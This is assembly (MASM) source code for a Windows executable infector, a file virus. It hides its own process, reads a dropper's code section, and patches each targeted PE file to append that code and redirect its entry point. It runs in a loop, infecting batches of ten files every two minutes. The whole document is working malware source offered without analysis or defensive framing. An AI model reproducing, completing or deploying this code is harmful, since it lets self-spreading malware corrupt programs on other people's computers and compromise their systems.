   includelib kernel32.lib
   includelib user32.lib
   includelib wsock32.lib

   .486
   .model flat, stdcall

   include c:\masm\include\windows.inc
   include c:\masm\include\wsock32.inc
   include c:\masm\include\kernel32.inc
   include c:\masm\include\user32.inc


   PE_Objects              equ     6
   PE_NTHdrSize            equ     20
   PE_Entrypoint           equ     40
   PE_ImageBase            equ     52
   PE_ObjectAlign          equ     56
   PE_FileAlign            equ     60
   PE_ImageSize            equ     80

   Obj_Name                equ     0
   Obj_VirtualSize         equ     8
   Obj_VirtualOffset       equ     12
   Obj_PhysicalSize        equ     16
   Obj_PhysicalOffset      equ     20
   Obj_Flags               equ     36

   .data
           DropperFilename         db      "dropper.exe",0
           FilelistFilename        db      "listfile.txt",0

           Dropper                 dd      0
           Filelist                dd      0
           Temp                    dd      0
           DropperSize             dd      0
           DropperMem              dd      0
           FilelistMem             dd      0
           FileHandle              dd      0

   .code
   Kernel32                db      "kernel32",0
   RegisterService         db      "RegisterServiceProcess", 0
   HideProgram:
           invoke  GetModuleHandleA, offset Kernel32
           invoke  GetProcAddress, eax, offset RegisterService
           test    eax,eax
           jz      NoHide

           push    1
           push    0
           call    eax
         NoHide:
          ret



     MyOpenFile:
           xor     edx,edx
           invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
           cmp     eax,INVALID_HANDLE_VALUE
           ret

   MyReadFile proc Filename:dword, MemPtr:dword
           pushad
           xor     esi,esi
           mov     eax,Filename
           mov     ebx,GENERIC_READ
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile
           jz      Error

           push    eax                             ; CloseHandle

           push    esi                             ; ReadFile, 0
           push    offset Temp                     ; ReadFile, Bytes Read
           mov     edi,eax

           invoke  GetFileSize, eax, esi
           push    eax                             ; ReadFile, How much to read

           add     eax,10                          ; allocate 10+FileSize bytes
           invoke  LocalAlloc, LMEM_ZEROINIT, eax
           mov     ecx,MemPtr
           mov     [ecx],eax

           push    eax                             ; ReadFile, Where to read it
           push    edi                             ; ReadFile, File Handle
           call    ReadFile

           call    CloseHandle

           popad
           ret
   MyReadFile endp


   Setup:
           lea     ebx,Filelist

           invoke  MyReadFile, offset FilelistFilename, ebx
           mov     ebx,[ebx]
           mov     FilelistMem, ebx
           add     ebx,[ebx+8]
           add     ebx,4000
           mov     Filelist, ebx

           lea     ebx,Dropper
           invoke  MyReadFile, offset DropperFilename, ebx

           mov     ebx,[ebx]
           mov     DropperMem, ebx
           add     ebx,[ebx+3ch]

           xor     ecx,ecx
           mov     cx,[ebx+PE_NTHdrSize]           ; HdrSize
           lea     eax,[ebx+24+ecx-40]             ; eax -> obj table

      FindCodeSegmentLoop:
           add     eax,8*5
           cmp     dword ptr [eax],'xet.'
           jnz     FindCodeSegmentLoop

           push    [eax+Obj_PhysicalSize]
           pop     DropperSize

           mov     eax,[eax+Obj_PhysicalOffset]
           add     Dropper, eax
           ret

      Error:

           invoke  ExitProcess, 0

   ObjectAlign:
           mov     ecx,[edi+PE_ObjectAlign]        ; calculate new virtual size
   XAlign:
           xor     edx,edx
           div     ecx
           inc     eax
           cdq
           mul     ecx
           ret

   InfectFile proc Filename:dword
           local   WhereToWriteDropper:dword

           pushad
           xor     esi,esi



           mov     eax,Filename
           mov     ebx,'NIW\'
           cmp     [eax+2],ebx
           jz      InfectionFailed

           mov     ebx,GENERIC_READ or GENERIC_WRITE
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile
           jz      InfectionFailed

           mov     FileHandle, eax

           invoke  GetFileSize, eax, esi           ; dont infect small files
           mov     edi,3000
           cmp     eax,edi
           jl      InfectionFailedCloseHandle

           sub     esp,edi                         ; alloc 3000 bytes from stack
           mov     ebx,esp
           invoke  ReadFile, FileHandle, ebx, edi, offset Temp, esi

           cmp     word ptr [ebx],'ZM'
           jnz     InfectionFailedAddStack

           mov     eax,[ebx+3ch]
           cmp     eax, 2800                       ; dont infect if header is
           ja      InfectionFailedAddStack         ; > 2800 bytes in file

           push    eax

           add     ebx,eax
           movsx   eax,word ptr [ebx+PE_Objects]
           imul    eax,eax,40
           add     ax,word ptr [ebx+PE_NTHdrSize]  ; eax = Size of header

           lea     ebx,[eax+24]                    ; ebx = Full header size
           pop     eax

           add     esp,edi                         ; dealloc mem from stack
           cmp     ebx,edi
           ja      InfectionFailedCloseHandle      ; dont infect if header is
                                                   ; bigger then 3000 bytes

           push    esi                             ; SetFilePtr, FILE_BEGIN
           push    esi                             ; SetFilePtr, 0
           push    eax                             ; SetFilePtr, PE_Start
           invoke  SetFilePointer, FileHandle, eax, esi, esi

           invoke  LocalAlloc, LMEM_ZEROINIT, ebx  ; alloc mem for header
           mov     edi, eax                        ; edi -> PE header

           push    ebx                             ; Size of header
           invoke  ReadFile, FileHandle, eax, ebx, offset Temp, esi

           lea     ebx,[edi+ebx-40]                ; ebx -> last object
           mov     eax, 'ler.'
           cmp     [ebx], eax                      ; is last segment .reloc
           jnz     NotReloc

           mov     [ebx+Obj_PhysicalSize],esi      ; no size
           mov     [ebx+Obj_VirtualSize],esi       ; no size

      NotReloc:
           mov     eax,DropperSize
           add     eax,20
           push    eax                             ; WriteFile

           mov     ecx,[ebx+Obj_PhysicalSize]
           add     eax,ecx                         ; eax = New physical size

           mov     edx,ecx
           add     ecx,[ebx+Obj_PhysicalOffset]    ; ecx -> Where to write virus
           mov     WhereToWriteDropper, ecx
           add     edx,[ebx+Obj_VirtualOffset]     ; edx -> New RVA
           xchg    edx,[edi+PE_Entrypoint]         ; set new RVA

           mov     esi, Dropper
           add     edx,[edi+PE_ImageBase]
           mov     [esi+11], edx                   ; save old RVA

           push    eax
           call    ObjectAlign                     ; calculate new virtual size

           lea     ecx,[ebx+Obj_VirtualSize]
           cmp     [ecx],eax
           ja      DontChangeVirtualSize           ; dont change it if existing
           mov     [ecx],eax                       ; is bigger
        DontChangeVirtualSize:

           pop     eax                             ; new size of last segment

           mov     ecx,[edi+PE_FileAlign]          ; calculate new physical size
           call    XAlign

           mov     [ebx+Obj_PhysicalSize],eax

           pop     eax                             ; calculate new image size
           add     eax,[edi+PE_ImageSize]
           call    ObjectAlign
           mov     [edi+PE_ImageSize], eax

           pop     ebx                             ; header size

           push    FileHandle
           call    SetFilePointer

           invoke  WriteFile, FileHandle, edi, ebx, offset Temp, 0
           mov     ebx,FileHandle
           invoke  LocalFree, edi                  ; free allocated mem
           mov     edi, eax                        ; edi = 0
           invoke  SetFilePointer, ebx, WhereToWriteDropper, edi, edi

           invoke  WriteFile, ebx, esi, DropperSize, offset Temp, edi
           jmp     InfectionFailedCloseHandle

    InfectionFailedAddStack:
           add     esp, 3000

    InfectionFailedCloseHandle:
           invoke  CloseHandle, FileHandle
    InfectionFailed:
           popad

           ret
   InfectFile endp

   Main:
           call    HideProgram
           xor     eax,eax

           call    Setup

           mov     ebx,10                          ; infect 10 files
           mov     esi,Filelist
        InfectionLoop:
           invoke  lstrlen, esi
           test    eax,eax
           jz      Return
           inc     eax
           push    esi
           add     esi, eax

           call    InfectFile
           dec     ebx
           jnz     InfectionLoop

           jmp     FileOpenNoSleep

      FileOpenLoop:
           invoke  Sleep, 1000                  ; sleep for one second
      FileOpenNoSleep:

           mov     eax,offset FilelistFilename
           mov     ebx,GENERIC_WRITE
           mov     ecx,OPEN_ALWAYS
           call    MyOpenFile
           jz      FileOpenLoop
           mov     ebx, eax

           invoke  GetFileSize, eax, 0
           test    eax,eax
           jz      WriteDefaultData

           xor     edi, edi
           invoke  SetFilePointer, ebx, 8, edi, edi

           push    0
           mov     eax,esp
           lea     ecx,[esi-4000]
           sub     ecx,FilelistMem
           push    ecx
           mov     ecx, esp
           invoke  WriteFile, ebx, ecx, 4, eax, 0
           pop     eax
           pop     eax

           invoke  CloseHandle, ebx

           invoke  Sleep, 1000*60*2                ; sleep for 2 minutes
           mov     ebx,10
           jmp     InfectionLoop


        WriteDefaultData:
           push    0
           mov     eax,esp                         ; eax = BytesWritten

           push    0
           push    4000
           push    0
           mov     ecx, esp                        ; ecx = What to write

           invoke  WriteFile, ebx, ecx, 12, eax, 0
           add     esp, 16
           invoke  CloseHandle, ebx

        Return:
           invoke  LocalFree, FilelistMem
           invoke  LocalFree, DropperMem


           mov     eax,offset FilelistFilename
           mov     ebx,GENERIC_WRITE
           mov     ecx,OPEN_ALWAYS
           call    MyOpenFile
           jz      QuitError
           mov     ebx, eax
           xor     esi, esi


           invoke  SetFilePointer, ebx, 4, esi, esi
           push    0
           push    4000
           mov     ecx, esp

           invoke  WriteFile, ebx, ecx, 8, offset FilelistMem, esi
           pop     edi                             ; edi = 4000
   ;       pop     eax                             ; eax = 0
   ;       push    esi

           push    ebx
           call    GetFileSize
           cmp     eax,edi
           jl      QuitError

           sub     eax,edi
           push    esi                             ; WriteFile, 0
           push    offset FilelistMem              ; WriteFile, BytesWritten
           push    eax                             ; WriteFile, BytesToWrite
           invoke  LocalAlloc, LMEM_ZEROINIT, eax
           push    eax                             ; WriteFile, Buffert
           push    ebx                             ; WriteFile, FileHandle
           xchg    edi, eax                        ; edi = Alloc mem, eax = 4000

           invoke  SetFilePointer, ebx, eax, esi, esi

           call    WriteFile

           invoke  CloseHandle, ebx
           invoke  LocalFree, edi


       QuitError:
           invoke  ExitProcess, 0


   end Main
